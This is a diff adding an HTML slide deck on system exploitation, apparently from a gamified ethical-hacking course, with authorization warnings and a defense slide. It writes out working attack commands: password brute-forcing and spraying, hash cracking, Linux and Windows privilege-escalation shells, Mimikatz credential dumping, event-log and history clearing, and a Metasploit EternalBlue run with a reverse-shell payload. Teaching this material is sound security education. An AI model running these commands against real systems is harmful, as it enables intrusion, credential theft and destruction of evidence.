@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Exploitation - Dark Arts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --house-primary: #6b21a8; --house-accent: #9333ea; --terminal-green: #00ff41; --bg-dark: #0a0a0a; --text-primary: #e5e5e5; --text-secondary: #8888aa; }
+        body { min-height: 100vh; background: #0a0a0a; font-family: 'Courier New', monospace; color: var(--text-primary); }
+        .presentation-header { padding: 20px 30px; background: rgba(10, 10, 10, 0.95); border-bottom: 2px solid var(--house-primary); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 0 20px rgba(107, 33, 168, 0.3); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { padding: 8px 16px; background: transparent; border: 1px solid var(--house-accent); color: var(--house-accent); cursor: pointer; font-family: 'Courier New', monospace; transition: all 0.2s ease; }
+        .back-btn:hover { background: rgba(147, 51, 234, 0.2); box-shadow: 0 0 10px var(--house-accent); }
+        .presentation-title { font-size: 1rem; color: var(--terminal-green); text-shadow: 0 0 5px var(--terminal-green); }
+        .house-badge { font-size: 0.7rem; padding: 6px 14px; background: rgba(107, 33, 168, 0.2); border: 1px solid var(--house-primary); color: var(--house-accent); letter-spacing: 0.15em; }
+        .progress-container { position: fixed; top: 61px; left: 0; right: 0; height: 3px; background: rgba(107, 33, 168, 0.2); z-index: 99; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, var(--house-primary), var(--house-accent)); width: 0%; transition: width 0.3s ease; }
+        .slide-container { max-width: 1000px; margin: 60px auto; padding: 40px; min-height: calc(100vh - 200px); }
+        .slide { display: none; animation: slideIn 0.4s ease; }
+        .slide.active { display: block; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .slide-content { background: linear-gradient(135deg, rgba(10, 10, 10, 0.95), rgba(26, 10, 46, 0.8)); border: 1px solid var(--house-primary); border-radius: 8px; padding: 50px; box-shadow: 0 0 30px rgba(107, 33, 168, 0.4); }
+        .slide-number { font-size: 0.8rem; color: var(--terminal-green); margin-bottom: 10px; }
+        h1 { font-size: 2.5rem; margin-bottom: 20px; color: var(--house-accent); text-shadow: 0 0 15px var(--house-accent); font-weight: 300; }
+        h2 { font-size: 1.8rem; margin-bottom: 25px; color: var(--house-accent); text-shadow: 0 0 10px var(--house-accent); border-bottom: 2px solid var(--house-primary); padding-bottom: 10px; }
+        h3 { font-size: 1.3rem; margin: 25px 0 15px 0; color: var(--terminal-green); text-shadow: 0 0 8px var(--terminal-green); }
+        p { font-size: 1.1rem; line-height: 1.8; margin-bottom: 20px; color: var(--text-primary); }
+        ul, ol { margin: 20px 0; padding-left: 30px; }
+        li { margin: 12px 0; line-height: 1.6; color: var(--text-primary); }
+        li::marker { color: var(--terminal-green); }
+        .code-block { background: #111; border: 1px solid var(--terminal-green); border-radius: 4px; padding: 20px; margin: 20px 0; font-family: 'Courier New', monospace; color: var(--terminal-green); overflow-x: auto; font-size: 0.95rem; }
+        .attack-card { background: rgba(0, 0, 0, 0.5); border-left: 4px solid var(--card-color); padding: 20px; margin: 15px 0; border-radius: 4px; }
+        .attack-card h4 { color: var(--card-color); margin-bottom: 10px; }
+        .comparison-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 25px 0; }
+        .comparison-box { background: rgba(0, 0, 0, 0.5); border: 1px solid var(--house-primary); padding: 20px; border-radius: 6px; }
+        .warning-box { background: rgba(220, 38, 38, 0.1); border: 2px solid #dc2626; border-radius: 6px; padding: 20px; margin: 20px 0; }
+        .warning-box h4 { color: #dc2626; margin-bottom: 10px; }
+        .slide-nav { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; padding-top: 30px; border-top: 1px solid var(--house-primary); }
+        .nav-btn { padding: 12px 30px; background: rgba(107, 33, 168, 0.3); border: 1px solid var(--house-accent); color: var(--house-accent); cursor: pointer; font-family: 'Courier New', monospace; transition: all 0.2s ease; }
+        .nav-btn:hover:not(:disabled) { background: rgba(147, 51, 234, 0.5); box-shadow: 0 0 15px var(--house-accent); }
+        .nav-btn:disabled { opacity: 0.3; cursor: not-allowed; }
+        .slide-counter { color: var(--terminal-green); font-size: 0.9rem; }
+        .complete-icon { font-size: 4rem; text-align: center; margin: 30px 0; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(1.05); } }
+        .xp-award { text-align: center; padding: 30px; background: rgba(0, 255, 65, 0.1); border: 2px solid var(--terminal-green); border-radius: 8px; margin: 30px 0; }
+        .xp-amount { font-size: 3rem; color: var(--terminal-green); text-shadow: 0 0 20px var(--terminal-green); font-weight: bold; }
+        @media (max-width: 768px) { .slide-container { padding: 20px; } .slide-content { padding: 30px 20px; } h1 { font-size: 2rem; } .comparison-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <header class="presentation-header">
+        <div class="header-left">
+            <button class="back-btn" onclick="history.back()">← BACK</button>
+            <span class="presentation-title">FEH-05: System Exploitation</span>
+        </div>
+        <span class="house-badge">DARK ARTS</span>
+    </header>
+    <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+    <div class="slide-container">
+        <!-- Slide 1 -->
+        <div class="slide active">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 01/13</div>
+                <h1>SYSTEM EXPLOITATION</h1>
+                <p style="font-size: 1.3rem; color: var(--terminal-green); text-shadow: 0 0 10px var(--terminal-green);">Turning Access Into Control</p>
+                <p style="margin-top: 40px;">Exploitation is where reconnaissance, scanning, and vulnerability assessment culminate. This is where you turn discovered weaknesses into actual system access and control.</p>
+                <div class="warning-box">
+                    <h4>⚠️ CRITICAL REMINDER</h4>
+                    <p>Everything in this module is for authorized penetration testing only. Unauthorized access to computer systems is a serious crime under federal and international law. Always have written authorization before attempting any exploitation techniques.</p>
+                </div>
+                <div class="code-block">
+<span style="color: var(--terminal-green);">exploit@darkarts</span>:<span style="color: var(--house-accent);">~</span># msfconsole<br>
+<span style="color: var(--terminal-green);">msf6 ></span> search eternal<br>
+<span style="color: var(--terminal-green);">msf6 ></span> use exploit/windows/smb/ms17_010_eternalblue
+                </div>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()" disabled>← PREVIOUS</button>
+                <span class="slide-counter">1 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 2 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 02/13</div>
+                <h2>Exploitation Overview</h2>
+                <p>Exploitation is the process of taking advantage of a vulnerability to gain unauthorized access, escalate privileges, or achieve other security objectives.</p>
+                <h3>Types of Exploitation</h3>
+                <ul>
+                    <li><strong>Remote Exploitation</strong> - Attack over network without physical access</li>
+                    <li><strong>Local Exploitation</strong> - Requires some level of access already (privilege escalation)</li>
+                    <li><strong>Client-Side Exploitation</strong> - Target user's browser, email client, etc.</li>
+                    <li><strong>Web Application Exploitation</strong> - SQLi, XSS, RCE through web apps</li>
+                    <li><strong>Password Attacks</strong> - Credential-based access (most common)</li>
+                    <li><strong>Social Engineering</strong> - Exploiting human vulnerabilities</li>
+                </ul>
+                <h3>Exploitation Goals</h3>
+                <ul>
+                    <li><strong>Initial Access</strong> - Get a foothold in the target environment</li>
+                    <li><strong>Code Execution</strong> - Run arbitrary commands on target system</li>
+                    <li><strong>Data Exfiltration</strong> - Steal sensitive information</li>
+                    <li><strong>Persistence</strong> - Maintain access for future use</li>
+                    <li><strong>Lateral Movement</strong> - Spread to other systems</li>
+                    <li><strong>Privilege Escalation</strong> - Gain higher-level access (root/SYSTEM)</li>
+                </ul>
+                <h3>Exploitation vs Proof of Concept</h3>
+                <p>In ethical hacking, you often stop at proving a vulnerability exists rather than fully exploiting it. Demonstrating access is usually sufficient without causing damage.</p>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">2 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 3 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 03/13</div>
+                <h2>Password Attacks</h2>
+                <p>The most common exploitation vector. Compromising credentials provides legitimate access without exploiting technical vulnerabilities.</p>
+                <h3>Attack Types</h3>
+                <div class="attack-card" style="--card-color: #ef4444;">
+                    <h4>Dictionary Attack</h4>
+                    <p>Try common passwords from a wordlist. Fast but limited by wordlist quality. Success depends on users choosing weak passwords.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Hydra dictionary attack against SSH<br>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #f97316;">
+                    <h4>Brute Force Attack</h4>
+                    <p>Try every possible password combination. Guaranteed to work eventually but extremely slow. Practical only for short passwords.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Brute force 4-character numeric PIN<br>
+crunch 4 4 0123456789 | hydra -l admin -P - ssh://target.com
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #fbbf24;">
+                    <h4>Rainbow Table Attack</h4>
+                    <p>Pre-computed hash tables for instant password cracking. Trade storage for speed. Defeated by salted hashes.</p>
+                </div>
+                <div class="attack-card" style="--card-color: #84cc16;">
+                    <h4>Credential Stuffing</h4>
+                    <p>Use leaked credentials from breaches. Many users reuse passwords across sites. Check haveibeenpwned.com for leaked databases.</p>
+                </div>
+                <div class="attack-card" style="--card-color: #22c55e;">
+                    <h4>Password Spraying</h4>
+                    <p>Try a few common passwords against many accounts. Avoids account lockouts. "Password123" against all users instead of many passwords against one user.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Password spray against list of usernames<br>
+crackmapexec smb target.com -u users.txt -p 'Password123'
+                    </div>
+                </div>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">3 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 4 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 04/13</div>
+                <h2>Password Cracking Tools</h2>
+                <p>When you have password hashes, cracking tools attempt to recover plaintext passwords. This is educational - understanding defense requires understanding attack.</p>
+                <h3>Hashcat</h3>
+                <p>GPU-accelerated password cracker. Fastest tool available. Supports hundreds of hash types.</p>
+                <div class="code-block">
+# Identify hash type<br>
+hashcat --example-hashes | grep -i "ntlm"<br>
+<br>
+# Dictionary attack<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt<br>
+<br>
+# Brute force (8 chars, lowercase + digits)<br>
+hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?d?d?d?d<br>
+<br>
+# Rule-based attack (dictionary + rules)<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule
+                </div>
+                <h3>John the Ripper</h3>
+                <p>CPU-based cracker. Excellent automatic mode and rule generation. Good for variety of formats.</p>
+                <div class="code-block">
+# Automatic mode (tries common passwords)<br>
+john hashes.txt<br>
+<br>
+# Dictionary attack<br>
+john --wordlist=rockyou.txt hashes.txt<br>
+<br>
+# Show cracked passwords<br>
+john --show hashes.txt
+                </div>
+                <h3>Common Hash Types</h3>
+                <ul>
+                    <li><strong>MD5</strong> - 32 hex characters (fast to crack, insecure)</li>
+                    <li><strong>SHA-1</strong> - 40 hex characters (deprecated)</li>
+                    <li><strong>NTLM</strong> - Windows password hashes</li>
+                    <li><strong>bcrypt</strong> - Secure hash with work factor (slow to crack)</li>
+                    <li><strong>SHA-256/512</strong> - Modern, stronger hashes</li>
+                </ul>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">4 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 5 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 05/13</div>
+                <h2>Privilege Escalation Overview</h2>
+                <p>Getting initial access is often just the beginning. Privilege escalation is moving from low-privilege access to administrative control.</p>
+                <h3>Types of Privilege Escalation</h3>
+                <div class="comparison-grid">
+                    <div class="comparison-box">
+                        <h4 style="color: var(--house-accent); margin-bottom: 15px;">Vertical Escalation</h4>
+                        <p style="font-size: 0.95rem; margin-bottom: 10px;">Moving from low-privilege user to high-privilege user (admin/root).</p>
+                        <p style="font-size: 0.9rem; color: var(--terminal-green); margin-top: 15px;">Examples:</p>
+                        <ul style="font-size: 0.9rem;">
+                            <li>Standard user → Administrator</li>
+                            <li>Web user → Root</li>
+                            <li>Guest → SYSTEM</li>
+                        </ul>
+                    </div>
+                    <div class="comparison-box">
+                        <h4 style="color: var(--house-accent); margin-bottom: 15px;">Horizontal Escalation</h4>
+                        <p style="font-size: 0.95rem; margin-bottom: 10px;">Moving from one user to another user with same privilege level.</p>
+                        <p style="font-size: 0.9rem; color: var(--terminal-green); margin-top: 15px;">Examples:</p>
+                        <ul style="font-size: 0.9rem;">
+                            <li>User A → User B</li>
+                            <li>Access another user's data</li>
+                            <li>Impersonate different account</li>
+                        </ul>
+                    </div>
+                </div>
+                <h3>Why Privilege Escalation Matters</h3>
+                <ul>
+                    <li>Initial access is often limited (web shell, low-privilege account)</li>
+                    <li>Administrative access allows:
+                        <ul style="margin-top: 10px;">
+                            <li>Install persistence mechanisms</li>
+                            <li>Disable security controls</li>
+                            <li>Access all data on system</li>
+                            <li>Pivot to other systems</li>
+                            <li>Clear logs and cover tracks</li>
+                        </ul>
+                    </li>
+                    <li>Demonstrates true impact of compromise</li>
+                </ul>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">5 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 6 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 06/13</div>
+                <h2>Linux Privilege Escalation</h2>
+                <p>Linux systems have numerous privilege escalation vectors. Enumeration is key to finding them.</p>
+                <h3>Common Vectors</h3>
+                <div class="attack-card" style="--card-color: #ef4444;">
+                    <h4>SUID/SGID Binaries</h4>
+                    <p>Files that run with owner's privileges. If misconfigured, can lead to root access.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Find SUID binaries<br>
+find / -perm -4000 2>/dev/null<br>
+<br>
+# Common exploitable SUID binaries:<br>
+# /usr/bin/find, /usr/bin/vim, /usr/bin/nano, etc.<br>
+<br>
+# Example exploit (if /usr/bin/find is SUID root):<br>
+find . -exec /bin/sh -p \; -quit
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #f97316;">
+                    <h4>Sudo Misconfigurations</h4>
+                    <p>User allowed to run certain commands as root. Check GTFOBins for exploitation techniques.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Check sudo permissions<br>
+sudo -l<br>
+<br>
+# Example: If allowed to run vim<br>
+sudo vim -c ':!/bin/sh'<br>
+<br>
+# Example: If allowed to run find<br>
+sudo find . -exec /bin/sh \; -quit
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #fbbf24;">
+                    <h4>Cron Jobs</h4>
+                    <p>Scheduled tasks running as root with writable scripts.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Check cron jobs<br>
+cat /etc/crontab<br>
+ls -la /etc/cron.*<br>
+<br>
+# If script is writable, replace with reverse shell
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #84cc16;">
+                    <h4>Kernel Exploits</h4>
+                    <p>Exploit kernel vulnerabilities for root. Nuclear option - can crash system.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Check kernel version<br>
+uname -a<br>
+<br>
+# Search for exploits<br>
+searchsploit linux kernel 4.4
+                    </div>
+                </div>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">6 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 7 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 07/13</div>
+                <h2>Windows Privilege Escalation</h2>
+                <p>Windows privilege escalation exploits misconfigurations in services, paths, and permissions.</p>
+                <h3>Common Vectors</h3>
+                <div class="attack-card" style="--card-color: #ef4444;">
+                    <h4>Unquoted Service Paths</h4>
+                    <p>Service path contains spaces without quotes. Windows searches for executables in unexpected locations.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Vulnerable: C:\Program Files\My App\service.exe<br>
+# Windows will try:<br>
+#   C:\Program.exe<br>
+#   C:\Program Files\My.exe<br>
+#   C:\Program Files\My App\service.exe<br>
+<br>
+# Find unquoted service paths<br>
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """<br>
+<br>
+# Place malicious executable in earlier path
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #f97316;">
+                    <h4>Weak Service Permissions</h4>
+                    <p>Service can be modified by low-privilege user. Replace service binary with malicious one.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Check service permissions with accesschk.exe<br>
+accesschk.exe -uwcqv "Authenticated Users" *<br>
+<br>
+# If service is writable, replace binary<br>
+sc config vulnerable binPath= "C:\path\to\malicious.exe"<br>
+sc stop vulnerable<br>
+sc start vulnerable
+                    </div>
+                </div>
+                <div class="attack-card" style="--card-color: #fbbf24;">
+                    <h4>DLL Hijacking</h4>
+                    <p>Application loads DLL from writable location. Place malicious DLL there.</p>
+                </div>
+                <div class="attack-card" style="--card-color: #84cc16;">
+                    <h4>Token Impersonation</h4>
+                    <p>Steal authentication tokens from privileged processes. Requires SeImpersonatePrivilege.</p>
+                    <div class="code-block" style="font-size: 0.9rem; margin-top: 10px;">
+# Check privileges<br>
+whoami /priv<br>
+<br>
+# If SeImpersonatePrivilege enabled, use tools like:<br>
+# - JuicyPotato<br>
+# - PrintSpoofer<br>
+# - RoguePotato
+                    </div>
+                </div>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">7 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 8 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 08/13</div>
+                <h2>Post-Exploitation</h2>
+                <p>Once you have high-level access, post-exploitation activities determine the full impact of compromise.</p>
+                <h3>Key Post-Exploitation Activities</h3>
+                <ul>
+                    <li><strong>Situational Awareness</strong> - Understand what you've compromised</li>
+                    <li><strong>Credential Harvesting</strong> - Extract stored passwords, tokens, keys</li>
+                    <li><strong>Lateral Movement</strong> - Spread to other systems on the network</li>
+                    <li><strong>Data Exfiltration</strong> - Identify and extract valuable data</li>
+                    <li><strong>Persistence</strong> - Maintain access for future use</li>
+                    <li><strong>Covering Tracks</strong> - Remove evidence (educational understanding only)</li>
+                </ul>
+                <h3>Situational Awareness Commands</h3>
+                <div class="code-block">
+# Linux<br>
+whoami && id<br>
+hostname<br>
+ip a<br>
+ps aux<br>
+netstat -tulpn<br>
+cat /etc/passwd<br>
+<br>
+# Windows<br>
+whoami /all<br>
+hostname<br>
+ipconfig /all<br>
+tasklist<br>
+netstat -ano<br>
+net user<br>
+net localgroup administrators
+                </div>
+                <h3>Credential Harvesting</h3>
+                <div class="code-block">
+# Linux - Search for credentials<br>
+grep -r "password" /home<br>
+find / -name "*.conf" -type f 2>/dev/null | xargs grep "pass"<br>
+cat ~/.bash_history<br>
+<br>
+# Windows - Dump credentials<br>
+# Using Mimikatz (if in memory):<br>
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+                </div>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">8 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 9 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 09/13</div>
+                <h2>Maintaining Access</h2>
+                <p>Persistence mechanisms ensure continued access even after reboots or detection of initial compromise. Understanding these helps defenders detect and remove them.</p>
+                <h3>Linux Persistence Techniques</h3>
+                <ul>
+                    <li><strong>SSH Keys</strong> - Add attacker's public key to ~/.ssh/authorized_keys</li>
+                    <li><strong>Cron Jobs</strong> - Schedule reverse shell to connect periodically</li>
+                    <li><strong>Systemd Services</strong> - Create service that runs on boot</li>
+                    <li><strong>.bashrc / .profile</strong> - Execute code when user logs in</li>
+                    <li><strong>Backdoor Accounts</strong> - Create hidden administrative user</li>
+                </ul>
+                <h3>Windows Persistence Techniques</h3>
+                <ul>
+                    <li><strong>Registry Run Keys</strong> - Execute on user login (HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run)</li>
+                    <li><strong>Scheduled Tasks</strong> - Run payload at specific times or events</li>
+                    <li><strong>Services</strong> - Create Windows service for persistence</li>
+                    <li><strong>Startup Folder</strong> - Place executable in startup folder</li>
+                    <li><strong>WMI Event Subscriptions</strong> - Advanced persistence using WMI</li>
+                    <li><strong>DLL Hijacking</strong> - Replace legitimate DLL with malicious one</li>
+                </ul>
+                <h3>Advanced Persistence: Rootkits</h3>
+                <p>Rootkits hide their presence by modifying the operating system. Types:</p>
+                <ul>
+                    <li><strong>User-mode Rootkits</strong> - Modify system binaries and libraries</li>
+                    <li><strong>Kernel-mode Rootkits</strong> - Operate at kernel level, very difficult to detect</li>
+                    <li><strong>Bootkit</strong> - Infect boot process, load before OS</li>
+                    <li><strong>Firmware Rootkit</strong> - Persist in device firmware, survive OS reinstall</li>
+                </ul>
+                <div class="warning-box">
+                    <h4>⚠️ Ethical Boundaries</h4>
+                    <p>In authorized penetration testing, you typically demonstrate persistence capability without implementing it fully. Always coordinate with client before installing persistence mechanisms.</p>
+                </div>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">9 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 10 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 10/13</div>
+                <h2>Covering Tracks</h2>
+                <p>Understanding how attackers cover their tracks helps defenders implement proper logging and detection. This is educational context - ethical hackers document everything.</p>
+                <h3>Log Manipulation Techniques</h3>
+                <ul>
+                    <li><strong>Log Deletion</strong> - Remove entire log files (obvious to defenders)</li>
+                    <li><strong>Log Clearing</strong> - Clear specific log entries</li>
+                    <li><strong>Log Tampering</strong> - Modify timestamps or content</li>
+                    <li><strong>Log Disabling</strong> - Stop logging services temporarily</li>
+                </ul>
+                <h3>Linux Log Locations</h3>
+                <div class="code-block">
+/var/log/auth.log       # Authentication attempts<br>
+/var/log/syslog         # System logs<br>
+/var/log/apache2/       # Web server logs<br>
+/var/log/secure         # Security logs (RHEL/CentOS)<br>
+~/.bash_history         # Command history<br>
+<br>
+# Attackers might:<br>
+> /var/log/auth.log     # Truncate log<br>
+history -c              # Clear command history<br>
+unset HISTFILE          # Disable history logging
+                </div>
+                <h3>Windows Log Locations</h3>
+                <div class="code-block">
+# Event Viewer logs:<br>
+- Security<br>
+- System<br>
+- Application<br>
+<br>
+# Clear Windows Event Logs (requires admin):<br>
+wevtutil cl Security<br>
+wevtutil cl System<br>
+<br>
+# PowerShell history:<br>
+del (Get-PSReadlineOption).HistorySavePath
+                </div>
+                <h3>Timestomping</h3>
+                <p>Modifying file timestamps to hide evidence of modification.</p>
+                <h3>Defensive Perspective</h3>
+                <ul>
+                    <li><strong>Centralized Logging</strong> - Forward logs to SIEM in real-time</li>
+                    <li><strong>Immutable Logs</strong> - Write-once storage prevents tampering</li>
+                    <li><strong>Log Integrity Monitoring</strong> - Detect log modifications</li>
+                    <li><strong>Backup Logs</strong> - Maintain copies attacker can't access</li>
+                </ul>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">10 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 11 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 11/13</div>
+                <h2>Metasploit Framework</h2>
+                <p>The world's most popular penetration testing framework. Modular, extensible, with thousands of exploits and payloads.</p>
+                <h3>Framework Structure</h3>
+                <ul>
+                    <li><strong>Exploits</strong> - Code that triggers vulnerabilities</li>
+                    <li><strong>Payloads</strong> - Code that runs after successful exploitation</li>
+                    <li><strong>Auxiliary</strong> - Supporting modules (scanners, fuzzers, etc.)</li>
+                    <li><strong>Encoders</strong> - Obfuscate payloads to evade detection</li>
+                    <li><strong>Post</strong> - Post-exploitation modules</li>
+                    <li><strong>Nops</strong> - No-operation instructions for buffer alignment</li>
+                </ul>
+                <h3>Basic Workflow</h3>
+                <div class="code-block">
+# Launch Metasploit<br>
+msfconsole<br>
+<br>
+# Search for exploit<br>
+search eternalblue<br>
+<br>
+# Select exploit<br>
+use exploit/windows/smb/ms17_010_eternalblue<br>
+<br>
+# View options<br>
+show options<br>
+<br>
+# Set required options<br>
+set RHOSTS 192.168.1.10<br>
+set LHOST 192.168.1.5<br>
+<br>
+# Select payload<br>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
+<br>
+# Check if target is vulnerable<br>
+check<br>
+<br>
+# Launch exploit<br>
+exploit<br>
+<br>
+# If successful, you get a Meterpreter shell
+                </div>
+                <h3>Meterpreter</h3>
+                <p>Advanced payload providing interactive shell with many features:</p>
+                <ul>
+                    <li>File upload/download</li>
+                    <li>Screenshot capture</li>
+                    <li>Keylogging</li>
+                    <li>Privilege escalation</li>
+                    <li>Credential dumping</li>
+                    <li>Network pivoting</li>
+                </ul>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">11 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 12 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 12/13</div>
+                <h2>Defense Perspective</h2>
+                <p>Understanding exploitation helps you defend against it. Every attack technique has corresponding detection and prevention strategies.</p>
+                <h3>Detecting Password Attacks</h3>
+                <ul>
+                    <li><strong>Failed Login Monitoring</strong> - Alert on multiple failures</li>
+                    <li><strong>Account Lockout Policies</strong> - Lock accounts after X failed attempts</li>
+                    <li><strong>Geolocation Analysis</strong> - Detect impossible travel</li>
+                    <li><strong>Baseline Behavior</strong> - Alert on unusual login times/locations</li>
+                    <li><strong>Honeypot Accounts</strong> - Fake accounts that trigger alerts when accessed</li>
+                </ul>
+                <h3>Detecting Privilege Escalation</h3>
+                <ul>
+                    <li><strong>File Integrity Monitoring</strong> - Detect modifications to SUID binaries, sudoers</li>
+                    <li><strong>Audit Logging</strong> - Log all sudo usage, privilege changes</li>
+                    <li><strong>Behavioral Analysis</strong> - Alert on unusual process trees</li>
+                    <li><strong>Kernel Module Monitoring</strong> - Detect unauthorized kernel modules</li>
+                </ul>
+                <h3>Detecting Post-Exploitation</h3>
+                <ul>
+                    <li><strong>Network Traffic Analysis</strong> - Detect beaconing, data exfiltration</li>
+                    <li><strong>Process Monitoring</strong> - Alert on suspicious processes (mimikatz, psexec)</li>
+                    <li><strong>Credential Monitoring</strong> - Detect credential dumping attempts</li>
+                    <li><strong>Lateral Movement Detection</strong> - Monitor for pass-the-hash, RDP brute force</li>
+                </ul>
+                <h3>Prevention Best Practices</h3>
+                <ul>
+                    <li>Patch management - Apply security updates promptly</li>
+                    <li>Least privilege principle - Users only get necessary permissions</li>
+                    <li>Strong password policies - Length, complexity, no reuse</li>
+                    <li>Multi-factor authentication - Second factor defeats password compromise</li>
+                    <li>Network segmentation - Limit lateral movement</li>
+                    <li>Application whitelisting - Only allow approved software</li>
+                    <li>EDR/XDR solutions - Advanced endpoint detection and response</li>
+                </ul>
+            </div>
+            <div class="slide-nav">
+                <button class="nav-btn" onclick="previousSlide()">← PREVIOUS</button>
+                <span class="slide-counter">12 / 13</span>
+                <button class="nav-btn" onclick="nextSlide()">NEXT →</button>
+            </div>
+        </div>
+
+        <!-- Slide 13 -->
+        <div class="slide">
+            <div class="slide-content">
+                <div class="slide-number">SLIDE 13/13</div>
+                <h2>Module Complete</h2>
+                <div class="complete-icon" style="color: var(--terminal-green); text-shadow: 0 0 30px var(--terminal-green);">✓</div>
+                <h3 style="text-align: center; margin-bottom: 30px;">System Exploitation</h3>
+                <p style="text-align: center; font-size: 1.1rem;">You've completed the Foundations of Ethical Hacking course. You now understand the complete penetration testing lifecycle from reconnaissance through exploitation and post-exploitation.</p>
+                <div class="xp-award">
+                    <p style="margin-bottom: 10px; color: var(--terminal-green);">XP EARNED</p>
+                    <div class="xp-amount">+25 XP</div>
